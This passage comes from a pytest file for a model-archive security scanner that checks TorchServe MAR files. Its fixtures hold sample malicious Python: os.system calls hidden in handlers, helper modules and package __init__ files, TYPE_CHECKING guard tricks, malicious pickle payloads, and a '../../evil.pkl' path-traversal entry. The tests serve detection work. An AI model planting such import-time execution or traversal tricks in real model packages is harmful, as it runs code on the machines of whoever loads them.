            "handler.py": b"import utils\n\ndef handle(data, context):\n    return utils.transform(data)\n",
            "utils.py": b"def transform(data):\n    return {'ok': True, 'data': data}\n",
            "weights.bin": b"weights",
        },
        filename="clean_utils.mar",
    )

    result = TorchServeMarScanner().scan(str(mar_path))
    non_handler_failures = _failed_checks(result, "MAR Non-Handler Python Analysis")
    assert len(non_handler_failures) == 0

    relationship_checks = [
        check
        for check in result.checks
        if check.name == "MAR Non-Handler Python Analysis"
        and check.status == CheckStatus.PASSED
        and check.details.get("import_relationships")
    ]
    assert len(relationship_checks) >= 1
    relationships = relationship_checks[0].details["import_relationships"]
    assert any(
        relationship["handler"] == "handler.py" and relationship["resolved_member"] == "utils.py"
        for relationship in relationships
    )


def test_non_handler_python_analysis_tracks_relative_import_relationships(tmp_path: Path) -> None:
    manifest = {"model": {"handler": "pkg/handlers/model.py", "serializedFile": "weights.bin"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={
            "pkg/handlers/model.py": (
                b"from . import utils\n\ndef handle(data, context):\n    return utils.transform(data)\n"
            ),
            "pkg/handlers/utils.py": b"def transform(data):\n    return {'ok': True, 'data': data}\n",
            "weights.bin": b"weights",
        },
        filename="relative_utils.mar",
    )

    result = TorchServeMarScanner().scan(str(mar_path))
    relationship_checks = [
        check
        for check in result.checks
        if check.name == "MAR Non-Handler Python Analysis"
        and check.status == CheckStatus.PASSED
        and check.details.get("import_relationships")
    ]
    assert len(relationship_checks) >= 1
    relationships = relationship_checks[0].details["import_relationships"]
    assert any(
        relationship["handler"] == "pkg/handlers/model.py"
        and relationship["imported_module"] == "pkg.handlers.utils"
        and relationship["resolved_member"] == "pkg/handlers/utils.py"
        for relationship in relationships
    )


def test_non_handler_python_analysis_detects_malicious_utils_module(tmp_path: Path) -> None:
    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={
            "handler.py": b"import utils\n\ndef handle(data, context):\n    return utils.transform(data)\n",
            "utils.py": b"import os\n\ndef transform(data):\n    return os.system('echo owned')\n",
            "weights.bin": b"weights",
        },
        filename="malicious_utils.mar",
    )

    result = TorchServeMarScanner().scan(str(mar_path))
    non_handler_failures = _failed_checks(result, "MAR Non-Handler Python Analysis")
    assert len(non_handler_failures) >= 1
    assert any(
        check.severity == IssueSeverity.WARNING and "high-risk calls: os.system" in check.message
        for check in non_handler_failures
    )


def test_non_handler_python_analysis_flags_duplicate_module_even_when_benign_copy_is_last(tmp_path: Path) -> None:
    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries=[
            ("handler.py", b"import utils\n\ndef handle(data, context):\n    return utils.transform(data)\n"),
            ("utils.py", b"import os\n\ndef transform(data):\n    return os.system('echo owned')\n"),
            ("utils.py", b"def transform(data):\n    return {'ok': True, 'data': data}\n"),
            ("weights.bin", b"weights"),
        ],
        filename="duplicate_utils_override.mar",
    )

    result = TorchServeMarScanner().scan(str(mar_path))
    non_handler_failures = _failed_checks(result, "MAR Non-Handler Python Analysis")

    assert len(non_handler_failures) >= 1
    assert any(
        failure.details.get("member") == "utils.py" and "high-risk calls: os.system" in failure.message
        for failure in non_handler_failures
    )


def test_non_handler_python_analysis_accepts_clean_duplicate_modules(tmp_path: Path) -> None:
    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries=[
            ("handler.py", b"import utils\n\ndef handle(data, context):\n    return utils.transform(data)\n"),
            ("utils.py", b"def transform(data):\n    return {'ok': True, 'data': data}\n"),
            ("utils.py", b"def transform(data):\n    return {'still_ok': True, 'data': data}\n"),
            ("weights.bin", b"weights"),
        ],
        filename="duplicate_utils_clean.mar",
    )

    result = TorchServeMarScanner().scan(str(mar_path))
    non_handler_failures = _failed_checks(result, "MAR Non-Handler Python Analysis")

    assert non_handler_failures == []


def test_non_handler_python_analysis_parses_each_helper_module_once(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={
            "handler.py": b"import utils\n\ndef handle(data, context):\n    return utils.transform(data)\n",
            "utils.py": b"def transform(data):\n    return {'ok': True, 'data': data}\n",
            "weights.bin": b"weights",
        },
        filename="single_parse_utils.mar",
    )

    real_parse = ast.parse
    parsed_sources: list[str] = []

    def counting_parse(source: str, *args: Any, **kwargs: Any) -> ast.AST:
        parsed_sources.append(source)
        return cast(ast.AST, real_parse(source, *args, **kwargs))

    monkeypatch.setattr("modelaudit.scanners.torchserve_mar_scanner.ast.parse", counting_parse)

    result = TorchServeMarScanner().scan(str(mar_path))

    assert result.success
    handler_parse_count = sum("def handle(data, context)" in source for source in parsed_sources)
    utils_parse_count = sum("def transform(data)" in source for source in parsed_sources)
    assert handler_parse_count == 1
    assert utils_parse_count == 1


def test_non_handler_python_metadata_assignments_do_not_trigger_import_time_execution(tmp_path: Path) -> None:
    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={
            "handler.py": b"import utils\n\ndef handle(data, context):\n    return utils.transform(data)\n",
            "utils.py": (
                b'"""Metadata-only helper."""\n'
                b'__all__ = ["transform"]\n'
                b'__version__ = "1.0.0"\n'
                b"import typing\n"
                b"if typing.TYPE_CHECKING:\n"
                b"    from typing import Any\n"
                b'if __name__ == "__main__":\n'
                b'    raise RuntimeError("cli only")\n'
                b"\n"
                b"def transform(data):\n"
                b"    return data\n"
            ),
            "weights.bin": b"weights",
        },
        filename="metadata_only_utils.mar",
    )

    result = TorchServeMarScanner().scan(str(mar_path))
    non_handler_failures = _failed_checks(result, "MAR Non-Handler Python Analysis")
    assert non_handler_failures == []


def test_import_time_analysis_respects_type_checking_rebinding() -> None:
    scanner = TorchServeMarScanner()
    imported_guard = ast.parse(
        "from typing import TYPE_CHECKING\nif TYPE_CHECKING:\n    __import__('os').system('id')\n"
    )
    relative_guard = ast.parse(
        "from .typing import TYPE_CHECKING\nif TYPE_CHECKING:\n    __import__('os').system('id')\n"
    )
    rebound_guard = ast.parse("TYPE_CHECKING = True\nif TYPE_CHECKING:\n    __import__('os').system('id')\n")
    disabled_guard = ast.parse("TYPE_CHECKING = False\nif TYPE_CHECKING:\n    __import__('os').system('id')\n")

    assert scanner._has_import_time_execution(imported_guard) is False
    assert scanner._has_import_time_execution(relative_guard) is True
    assert scanner._has_import_time_execution(rebound_guard) is True
    assert scanner._has_import_time_execution(disabled_guard) is False


def test_import_time_analysis_checks_selected_guard_else_branches() -> None:
    scanner = TorchServeMarScanner()
    false_guard_else = ast.parse(
        "TYPE_CHECKING = False\nif TYPE_CHECKING:\n    pass\nelse:\n    __import__('os').system('id')\n"
    )
    imported_guard_else = ast.parse(
        "from typing import TYPE_CHECKING\nif TYPE_CHECKING:\n    pass\nelse:\n    __import__('os').system('id')\n"
    )

    assert scanner._has_import_time_execution(false_guard_else) is True
    assert scanner._has_import_time_execution(imported_guard_else) is True


def test_non_handler_python_logger_initialization_does_not_trigger_import_time_execution(tmp_path: Path) -> None:
    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={
            "handler.py": b"import utils\n\ndef handle(data, context):\n    return utils.transform(data)\n",
            "utils.py": (
                b"import logging as log\nlogger = log.getLogger(__name__)\n\ndef transform(data):\n    return data\n"
            ),
            "weights.bin": b"weights",
        },
        filename="logger_init_utils.mar",
    )

    result = TorchServeMarScanner().scan(str(mar_path))
    non_handler_failures = _failed_checks(result, "MAR Non-Handler Python Analysis")
    assert non_handler_failures == []


def test_non_handler_python_analysis_detects_malicious_init_module(tmp_path: Path) -> None:
    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={
            "handler.py": b"import pkg\n\ndef handle(data, context):\n    return {'ok': True}\n",
            "pkg/__init__.py": b"import os\nos.system('echo owned')\n",
            "weights.bin": b"weights",
        },
        filename="malicious_init.mar",
    )

    result = TorchServeMarScanner().scan(str(mar_path))
    non_handler_failures = _failed_checks(result, "MAR Non-Handler Python Analysis")
    assert len(non_handler_failures) >= 1
    assert any(
        check.severity == IssueSeverity.WARNING and "__init__.py executes during package import" in check.message
        for check in non_handler_failures
    )


def test_non_handler_python_analysis_without_extra_python_files_is_back_compatible(tmp_path: Path) -> None:
    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={
            "handler.py": b"def handle(data, context):\n    return {'ok': True}\n",
            "weights.bin": b"weights",
        },
        filename="no_extra_python.mar",
    )

    result = TorchServeMarScanner().scan(str(mar_path))
    non_handler_failures = _failed_checks(result, "MAR Non-Handler Python Analysis")
    assert len(non_handler_failures) == 0


def test_non_handler_python_analysis_respects_entry_limit(tmp_path: Path) -> None:
    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={
            "handler.py": b"def handle(data, context):\n    return {'ok': True}\n",
            "utils.py": b"import os\n\ndef transform(data):\n    return os.system('echo owned')\n",
            "weights.bin": b"weights",
        },
        filename="entry_limit_non_handler.mar",
    )

    result = TorchServeMarScanner(config={"max_mar_entries": 2}).scan(str(mar_path))

    non_handler_failures = _failed_checks(result, "MAR Non-Handler Python Analysis")
    assert len(non_handler_failures) == 0
    entry_limit_failures = _failed_checks(result, "TorchServe MAR Entry Limit")
    assert len(entry_limit_failures) == 1
    assert entry_limit_failures[0].severity == IssueSeverity.INFO
    assert result.success is False
    assert result.metadata["analysis_incomplete"] is True
    assert "torchserve_mar_entry_limit" in result.metadata["scan_outcome_reasons"]


def test_benign_mar_entry_limit_returns_inconclusive_exit_code(tmp_path: Path) -> None:
    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={
            "handler.py": b"def handle(data, context):\n    return {'ok': True}\n",
            "weights.bin": b"weights",
            "notes.txt": b"ordinary metadata",
        },
        filename="benign_entry_limit.mar",
    )

    direct = TorchServeMarScanner(config={"max_mar_entries": 3}).scan(str(mar_path))
    _assert_inconclusive_aggregate_not_cached(
        mar_path,
        "torchserve_mar_entry_limit",
        tmp_path / "benign-entry-limit-cache",
        max_mar_entries=3,
    )

    entry_limit_failures = _failed_checks(direct, "TorchServe MAR Entry Limit")
    assert len(entry_limit_failures) == 1
    assert entry_limit_failures[0].severity == IssueSeverity.INFO
    assert not [issue for issue in direct.issues if issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}]
    assert direct.metadata["scan_outcome"] == "inconclusive"


def test_non_handler_python_analysis_respects_uncompressed_budget(tmp_path: Path) -> None:
    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={
            "handler.py": b"def handle(data, context):\n    return {'ok': True}\n",
            "utils.py": b"import os\n\ndef transform(data):\n    return os.system('echo owned')\n",
            "weights.bin": b"weights",
        },
        filename="budget_limited_non_handler.mar",
    )

    with zipfile.ZipFile(mar_path, "r") as archive:
        member_sizes = {info.filename: info.file_size for info in archive.infolist()}

    budget = member_sizes["MAR-INF/MANIFEST.json"] + member_sizes["handler.py"]
    result = TorchServeMarScanner(config={"max_mar_uncompressed_bytes": budget}).scan(str(mar_path))

    non_handler_failures = _failed_checks(result, "MAR Non-Handler Python Analysis")
    assert len(non_handler_failures) == 0
    budget_failures = _failed_checks(result, "TorchServe MAR Uncompressed Size Budget")
    assert len(budget_failures) == 1
    assert budget_failures[0].severity == IssueSeverity.INFO
    assert result.success is False
    assert result.metadata["analysis_incomplete"] is True
    _assert_inconclusive_aggregate_not_cached(
        mar_path,
        "torchserve_mar_uncompressed_budget",
        tmp_path / "non-handler-budget-cache",
        max_mar_uncompressed_bytes=budget,
    )


def test_non_handler_python_analysis_handles_valueerror_from_ast_parse(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={
            "handler.py": b"import utils\n\ndef handle(data, context):\n    return utils.transform(data)\n",
            "utils.py": b"def transform(data):\n    return {'ok': True, 'data': data}\n",
            "weights.bin": b"weights",
        },
        filename="valueerror_utils.mar",
    )

    real_parse_python_source = TorchServeMarScanner._parse_python_source

    def parse_with_valueerror(
        self: TorchServeMarScanner,
        source_bytes: bytes,
    ) -> tuple[ast.Module | None, str | None]:
        if b"def transform(data)" in source_bytes:
            return None, "source code string cannot contain null bytes"
        return real_parse_python_source(self, source_bytes)

    monkeypatch.setattr(TorchServeMarScanner, "_parse_python_source", parse_with_valueerror)

    result = TorchServeMarScanner().scan(str(mar_path))

    non_handler_failures = _failed_checks(result, "MAR Non-Handler Python Analysis")
    assert any(
        check.location == f"{mar_path}:utils.py"
        and check.severity == IssueSeverity.INFO
        and "Unable to parse non-handler Python source for static analysis" in check.message
        and check.details.get("analysis_kind") == "syntax"
        for check in non_handler_failures
    )
    assert not _failed_checks(result, "TorchServe MAR Scan")
    assert result.success is False
    assert "torchserve_non_handler_python_parse_failed" in result.metadata["scan_outcome_reasons"]
    _assert_inconclusive_aggregate_not_cached(
        mar_path,
        "torchserve_non_handler_python_parse_failed",
        tmp_path / "non-handler-parse-cache",
    )


def test_non_handler_python_analysis_read_failure_is_reported_without_aborting(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={
            "handler.py": b"import utils\n\ndef handle(data, context):\n    return utils.transform(data)\n",
            "utils.py": b"def transform(data):\n    return {'ok': True, 'data': data}\n",
            "weights.bin": b"weights",
        },
        filename="read_failure_utils.mar",
    )

    original_read_member_bounded = TorchServeMarScanner._read_member_bounded

    def read_with_failure(
        self: TorchServeMarScanner,
        archive: zipfile.ZipFile,
        member_info: zipfile.ZipInfo,
        max_bytes: int,
    ) -> bytes:
        if member_info.filename == "utils.py":
            raise RuntimeError("CRC mismatch")
        return original_read_member_bounded(self, archive, member_info, max_bytes)

    monkeypatch.setattr(TorchServeMarScanner, "_read_member_bounded", read_with_failure)

    result = TorchServeMarScanner().scan(str(mar_path))

    non_handler_failures = _failed_checks(result, "MAR Non-Handler Python Analysis")
    assert any(
        check.location == f"{mar_path}:utils.py"
        and check.severity == IssueSeverity.INFO
        and "Unable to read non-handler Python source for static analysis: CRC mismatch" in check.message
        and check.details.get("analysis_kind") == "read"
        for check in non_handler_failures
    )
    assert not _failed_checks(result, "TorchServe MAR Scan")
    assert result.success is False
    assert "torchserve_non_handler_python_read_failed" in result.metadata["scan_outcome_reasons"]
    _assert_inconclusive_aggregate_not_cached(
        mar_path,
        "torchserve_non_handler_python_read_failed",
        tmp_path / "non-handler-read-cache",
    )


def test_scan_resolves_bare_module_handler_names(tmp_path: Path) -> None:
    manifest = {"model": {"handler": "custom_handler", "serializedFile": "weights.bin"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={
            "custom_handler.py": b"import os\n\ndef handle(data, context):\n    return os.system('id')\n",
            "weights.bin": b"weights",
        },
        filename="bare_handler.mar",
    )

    result = TorchServeMarScanner().scan(str(mar_path))
    manifest_integrity_failures = _failed_checks(result, "TorchServe Manifest Reference Integrity")
    handler_failures = _failed_checks(result, "TorchServe Handler Static Analysis")

    assert len(manifest_integrity_failures) == 0
    assert len(handler_failures) >= 1
    assert any(
        failure.severity == IssueSeverity.CRITICAL and "os.system" in failure.message for failure in handler_failures
    )


def test_scan_analyzes_all_resolved_handler_candidates(tmp_path: Path) -> None:
    manifest = {"model": {"handler": "custom_handler", "serializedFile": "weights.bin"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={
            "custom_handler.py": b"def handle(data, context):\n    return {'ok': True}\n",
            "custom_handler/__init__.py": b"import os\n\ndef handle(data, context):\n    return os.system('id')\n",
            "weights.bin": b"weights",
        },
        filename="bare_handler_with_package.mar",
    )

    result = TorchServeMarScanner().scan(str(mar_path))
    manifest_integrity_failures = _failed_checks(result, "TorchServe Manifest Reference Integrity")
    handler_failures = _failed_checks(result, "TorchServe Handler Static Analysis")

    assert len(manifest_integrity_failures) == 0
    assert any(
        failure.severity == IssueSeverity.CRITICAL
        and failure.location == f"{mar_path}:custom_handler/__init__.py"
        and "os.system" in failure.message
        for failure in handler_failures
    )


def test_scan_resolves_slash_delimited_handler_names(tmp_path: Path) -> None:
    manifest = {"model": {"handler": "pkg/handlers/model:handle", "serializedFile": "weights.bin"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={
            "pkg/handlers/model.py": b"import os\n\ndef handle(data, context):\n    return os.system('id')\n",
            "weights.bin": b"weights",
        },
        filename="slash_handler.mar",
    )

    result = TorchServeMarScanner().scan(str(mar_path))
    manifest_integrity_failures = _failed_checks(result, "TorchServe Manifest Reference Integrity")
    handler_failures = _failed_checks(result, "TorchServe Handler Static Analysis")

    assert len(manifest_integrity_failures) == 0
    assert any(
        failure.severity == IssueSeverity.CRITICAL
        and failure.location == f"{mar_path}:pkg/handlers/model.py"
        and "os.system" in failure.message
        for failure in handler_failures
    )


def test_scan_detects_malicious_pickle_payload_in_serialized_file(tmp_path: Path) -> None:
    manifest = {"model": {"handler": "handler.py", "serializedFile": "model.pkl"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={
            "handler.py": b"def handle(data, context):\n    return data\n",
            "model.pkl": _build_malicious_pickle(),
        },
    )

    result = TorchServeMarScanner().scan(str(mar_path))
    serialized_security_checks = _failed_checks(result, "TorchServe Serialized Payload Security")
    assert len(serialized_security_checks) >= 1
    assert any(":model.pkl" in (issue.location or "") for issue in result.issues)


def test_scan_fails_closed_when_manifest_payload_falls_after_entry_limit(tmp_path: Path) -> None:
    manifest = {"model": {"handler": "handler.py", "serializedFile": "late.pkl"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries=[
            ("handler.py", b"def handle(data, context):\n    return data\n"),
            ("filler.txt", b"filler"),
            ("late.pkl", _build_malicious_pickle()),
        ],
        filename="late_payload_after_entry_limit.mar",
    )

    result = TorchServeMarScanner(config={"max_mar_entries": 3}).scan(str(mar_path))
    _assert_inconclusive_aggregate_not_cached(
        mar_path,
        "torchserve_mar_entry_limit",
        tmp_path / "late-payload-entry-cache",
        max_mar_entries=3,
    )

    assert result.success is False
    assert result.metadata["analysis_incomplete"] is True
    entry_limit_checks = _failed_checks(result, "TorchServe MAR Entry Limit")
    coverage_checks = _failed_checks(result, "TorchServe Manifest Referenced Payload Coverage")
    assert len(entry_limit_checks) == 1
    assert entry_limit_checks[0].severity == IssueSeverity.INFO
    assert len(coverage_checks) == 1
    assert coverage_checks[0].details["unscanned_payload_members"] == ["late.pkl"]
    assert not _checks_named(result, "TorchServe Serialized Payload Security")


def test_scan_preserves_detected_payload_finding_when_a_later_entry_is_skipped(tmp_path: Path) -> None:
    manifest = {"model": {"handler": "handler.py", "serializedFile": "model.pkl"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries=[
            ("handler.py", b"def handle(data, context):\n    return data\n"),
            ("model.pkl", _build_malicious_pickle()),
            ("late.txt", b"ordinary skipped content"),
        ],
        filename="detected_payload_before_entry_limit.mar",
    )

    result = TorchServeMarScanner(config={"max_mar_entries": 3}).scan(str(mar_path))
    aggregate = core.scan_model_directory_or_file(
        str(mar_path),
        cache_enabled=False,
        max_mar_entries=3,
    )

    entry_limit_checks = _failed_checks(result, "TorchServe MAR Entry Limit")
    serialized_checks = _failed_checks(result, "TorchServe Serialized Payload Security")
    assert len(entry_limit_checks) == 1
    assert entry_limit_checks[0].severity == IssueSeverity.INFO
    assert serialized_checks
    assert core.determine_exit_code(aggregate) == 1


def test_scan_fails_closed_when_manifest_payload_exceeds_member_limit(tmp_path: Path) -> None:
    manifest = {"model": {"handler": "handler.py", "serializedFile": "model.pkl"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={
            "handler.py": b"def handle(data, context):\n    return data\n",
            "model.pkl": _build_malicious_pickle() + (b"\x00" * 4096),
        },
        filename="serialized_payload_too_large.mar",
    )

    result = TorchServeMarScanner(config={"max_mar_member_bytes": 128}).scan(str(mar_path))
    _assert_inconclusive_aggregate_not_cached(
        mar_path,
        "torchserve_mar_member_size_limit",
        tmp_path / "payload-member-cache",
        max_mar_member_bytes=128,
    )

    assert result.success is False
    assert result.metadata["analysis_incomplete"] is True
    member_limit_checks = _failed_checks(result, "TorchServe MAR Member Size Limit")
    coverage_checks = _failed_checks(result, "TorchServe Manifest Referenced Payload Coverage")
    assert len(member_limit_checks) == 1
    assert member_limit_checks[0].severity == IssueSeverity.INFO
    assert len(coverage_checks) == 1
    assert coverage_checks[0].details["unscanned_payload_members"] == ["model.pkl"]
    assert not _checks_named(result, "TorchServe Serialized Payload Security")


def test_scan_fails_closed_when_manifest_payload_falls_after_uncompressed_budget(tmp_path: Path) -> None:
    manifest = {"model": {"handler": "handler.py", "serializedFile": "late.pkl"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries=[
            ("handler.py", b"def handle(data, context):\n    return data\n"),
            ("late.pkl", _build_malicious_pickle()),
        ],
        filename="late_payload_after_budget.mar",
    )

    with zipfile.ZipFile(mar_path, "r") as archive:
        member_sizes = {info.filename: info.file_size for info in archive.infolist()}

    budget = member_sizes["MAR-INF/MANIFEST.json"] + member_sizes["handler.py"]
    result = TorchServeMarScanner(config={"max_mar_uncompressed_bytes": budget}).scan(str(mar_path))
    _assert_inconclusive_aggregate_not_cached(
        mar_path,
        "torchserve_mar_uncompressed_budget",
        tmp_path / "payload-budget-cache",
        max_mar_uncompressed_bytes=budget,
    )

    assert result.success is False
    assert result.metadata["analysis_incomplete"] is True
    budget_checks = _failed_checks(result, "TorchServe MAR Uncompressed Size Budget")
    coverage_checks = _failed_checks(result, "TorchServe Manifest Referenced Payload Coverage")
    assert len(budget_checks) == 1
    assert budget_checks[0].severity == IssueSeverity.INFO
    assert len(coverage_checks) == 1
    assert coverage_checks[0].details["unscanned_payload_members"] == ["late.pkl"]
    assert not _checks_named(result, "TorchServe Serialized Payload Security")


def test_scan_detects_path_traversal_member_names(tmp_path: Path) -> None:
    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={
            "handler.py": b"def handle(data, context):\n    return data\n",
            "weights.bin": b"weights",
            "../../evil.pkl": _build_malicious_pickle(),
        },
    )

    result = TorchServeMarScanner().scan(str(mar_path))
    traversal_failures = _failed_checks(result, "TorchServe MAR Path Traversal Protection")
    assert len(traversal_failures) >= 1
    assert traversal_failures[0].severity == IssueSeverity.CRITICAL
    details = traversal_failures[0].details
    assert details["cve_id"] == "CVE-2023-48299"
    assert details["cvss"] == 7.5
    assert details["cwe"] == "CWE-22"
    assert "TorchServe MAR archives with traversal entries" in details["description"]
    assert "remediation" in details


def test_unreadable_symlink_target_returns_inconclusive_exit_code(tmp_path: Path) -> None:
    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={
            "handler.py": b"def handle(data, context):\n    return data\n",
            "weights.bin": b"weights",
        },
        filename="oversized_symlink_target.mar",
    )
    symlink_info = zipfile.ZipInfo("model_link")
    symlink_info.create_system = 3
    symlink_info.external_attr = (stat.S_IFLNK | 0o777) << 16
    with zipfile.ZipFile(mar_path, "a") as archive:
        archive.writestr(symlink_info, b"a" * 4097)

    direct = TorchServeMarScanner().scan(str(mar_path))
    _assert_inconclusive_aggregate_not_cached(
        mar_path,
        "torchserve_mar_symlink_target_read_failed",
        tmp_path / "symlink-read-cache",
    )

    symlink_failures = _failed_checks(direct, "TorchServe MAR Symlink Safety Validation")
    assert len(symlink_failures) == 1
    assert symlink_failures[0].severity == IssueSeverity.INFO
    assert "torchserve_mar_symlink_target_read_failed" in direct.metadata["scan_outcome_reasons"]


def test_scan_allows_normalized_safe_member_names(tmp_path: Path) -> None:
    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={
            "handler.py": b"def handle(data, context):\n    return data\n",
            "subdir/../weights.bin": b"weights",
        },
        filename="normalized_safe.mar",
    )

    result = TorchServeMarScanner().scan(str(mar_path))

    traversal_failures = _failed_checks(result, "TorchServe MAR Path Traversal Protection")
    assert traversal_failures == []
    assert not [check for check in result.checks if check.details.get("cve_id") == "CVE-2023-48299"]


def test_scan_detects_conflicting_duplicate_manifest_handler_entries(tmp_path: Path) -> None:
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=None,
        entries=[
            (
                "MAR-INF/MANIFEST.json",
                json.dumps({"model": {"handler": "safe_handler.py", "serializedFile": "weights.bin"}}).encode(),
            ),
            ("safe_handler.py", b"def handle(data, context):\n    return {'ok': True}\n"),
            ("weights.bin", b"weights"),
            (
                "MAR-INF/MANIFEST.json",
                json.dumps({"model": {"handler": "evil_handler.py", "serializedFile": "weights.bin"}}).encode(),
            ),
            ("evil_handler.py", b"import os\n\ndef handle(data, context):\n    return os.system('id')\n"),
        ],
        filename="duplicate_manifest_handler.mar",
    )

    result = TorchServeMarScanner().scan(str(mar_path))
    collision_failures = _failed_checks(result, "TorchServe Manifest Collision")
    handler_failures = _failed_checks(result, "TorchServe Handler Static Analysis")
    non_handler_failures = _failed_checks(result, "MAR Non-Handler Python Analysis")

    assert len(collision_failures) == 1
    assert collision_failures[0].severity == IssueSeverity.WARNING
    assert any(
        failure.severity == IssueSeverity.CRITICAL
        and failure.location == f"{mar_path}:evil_handler.py"
        and "os.system" in failure.message
        for failure in handler_failures
    )
    assert not any(failure.location == f"{mar_path}:evil_handler.py" for failure in non_handler_failures)


def test_manifest_parsing_keeps_readable_manifest_when_later_duplicate_is_unreadable(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    manifest_bytes = json.dumps({"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}).encode()
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=None,
        entries=[
            ("MAR-INF/MANIFEST.json", manifest_bytes),
            ("MAR-INF/MANIFEST.json", manifest_bytes),
            ("handler.py", b"import os\n\ndef handle(data, context):\n    return os.system('id')\n"),
            ("weights.bin", b"weights"),
        ],
        filename="unreadable_duplicate_manifest.mar",
    )

    scanner = TorchServeMarScanner()
    real_read_member_bounded = scanner._read_member_bounded
    manifest_read_count = 0

    def flaky_read_member_bounded(
        archive: zipfile.ZipFile,
        member_info: zipfile.ZipInfo,
        max_bytes: int,
    ) -> bytes:
        nonlocal manifest_read_count
        if member_info.filename == "MAR-INF/MANIFEST.json":
            manifest_read_count += 1
            if manifest_read_count == 2:
                raise OSError("manifest CRC mismatch")
        return real_read_member_bounded(archive, member_info, max_bytes)

    monkeypatch.setattr(scanner, "_read_member_bounded", flaky_read_member_bounded)

    result = scanner.scan(str(mar_path))

    assert result.success is False
    manifest_read_failures = _failed_checks(result, "TorchServe Manifest Read")
    assert len(manifest_read_failures) == 1
    assert manifest_read_failures[0].severity == IssueSeverity.INFO
    assert "manifest CRC mismatch" in manifest_read_failures[0].message
    assert "torchserve_manifest_read_failed" in result.metadata["scan_outcome_reasons"]
    handler_failures = _failed_checks(result, "TorchServe Handler Static Analysis")
    assert any(
        failure.severity == IssueSeverity.CRITICAL and "os.system" in failure.message for failure in handler_failures
    )


def test_scan_accepts_duplicate_identical_manifest_entries(tmp_path: Path) -> None:
    manifest_bytes = json.dumps({"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}).encode()
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=None,
        entries=[
            ("MAR-INF/MANIFEST.json", manifest_bytes),
            ("MAR-INF/MANIFEST.json", manifest_bytes),
            ("handler.py", b"def handle(data, context):\n    return {'ok': True}\n"),
            ("weights.bin", b"weights"),
        ],
        filename="duplicate_identical_manifest.mar",
    )

    result = TorchServeMarScanner().scan(str(mar_path))

    assert _failed_checks(result, "TorchServe Manifest Collision") == []
    assert _failed_checks(result, "TorchServe Handler Static Analysis") == []


def test_scan_accepts_many_duplicate_identical_manifest_entries(tmp_path: Path) -> None:
    manifest_bytes = json.dumps({"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}).encode()
    entries: list[tuple[str, bytes]] = [("MAR-INF/MANIFEST.json", manifest_bytes) for _ in range(128)]
    entries.extend(
        [
            ("handler.py", b"def handle(data, context):\n    return {'ok': True}\n"),
            ("weights.bin", b"weights"),
        ]
    )
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=None,
        entries=entries,
        filename="many_duplicate_identical_manifest.mar",
    )

    result = TorchServeMarScanner().scan(str(mar_path))

    assert _failed_checks(result, "TorchServe Manifest Collision") == []
    assert _failed_checks(result, "TorchServe Handler Static Analysis") == []


def test_manifest_parsing_respects_entry_limit_for_duplicate_manifest_floods(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
